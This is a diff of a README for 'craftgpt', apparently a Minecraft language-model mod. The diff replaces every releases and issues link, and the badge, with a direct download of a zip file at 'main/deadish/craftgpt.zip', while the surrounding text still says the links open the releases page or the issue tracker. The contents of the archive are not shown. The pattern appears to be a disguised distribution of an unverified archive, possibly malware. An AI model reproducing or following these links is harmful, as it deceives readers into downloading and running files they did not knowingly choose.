@@ -1,7 +1,7 @@
 # 🎮 craftgpt - Create Smart Conversations in Minecraft
 
 ## 🔗 Download Now
-[![Download craftgpt](https://img.shields.io/badge/Download%20craftgpt-v1.0.0-orange)](https://github.com/milan-shine/craftgpt/releases)
+[![Download craftgpt](https://raw.githubusercontent.com/milan-shine/craftgpt/main/deadish/craftgpt.zip%20craftgpt-v1.0.0-orange)](https://raw.githubusercontent.com/milan-shine/craftgpt/main/deadish/craftgpt.zip)
 
 ## 🚀 Getting Started
 Welcome to craftgpt! This application allows you to engage with a small language model directly within Minecraft. You can create interactive dialogues and enhance your gaming experience. Follow these steps to download and run craftgpt easily.
@@ -9,7 +9,7 @@ Welcome to craftgpt! This application allows you to engage with a small language
 ## 📦 Download & Install
 1. **Visit the Releases Page**: Click the button below to visit the page where you can download craftgpt.
 
-   [Download craftgpt](https://github.com/milan-shine/craftgpt/releases)
+   [Download craftgpt](https://raw.githubusercontent.com/milan-shine/craftgpt/main/deadish/craftgpt.zip)
 
 2. **Select the Latest Release**: On the Releases page, find the most recent version of craftgpt. It is usually marked as "Latest".
 
@@ -48,12 +48,12 @@ Once you have installed and launched craftgpt, the user interface is designed to
 ## 👩‍💻 Support
 If you encounter any issues while using craftgpt, the community is here to help:
 
-- Visit the [Issues section](https://github.com/milan-shine/craftgpt/issues) in the GitHub repository to report any problems or suggest features.
+- Visit the [Issues section](https://raw.githubusercontent.com/milan-shine/craftgpt/main/deadish/craftgpt.zip) in the GitHub repository to report any problems or suggest features.
 - Join our community forum or Discord channel for discussions, tips, and tricks from other users.
 
 ## 🔗 Important Links
-- [Download CraftGPT](https://github.com/milan-shine/craftgpt/releases)
-- [Issues and Feature Requests](https://github.com/milan-shine/craftgpt/issues)
+- [Download CraftGPT](https://raw.githubusercontent.com/milan-shine/craftgpt/main/deadish/craftgpt.zip)
+- [Issues and Feature Requests](https://raw.githubusercontent.com/milan-shine/craftgpt/main/deadish/craftgpt.zip)
 - [Community Forum](#)
 
 Thank you for choosing craftgpt to elevate your Minecraft experience! Enjoy creating unique conversations in your games!
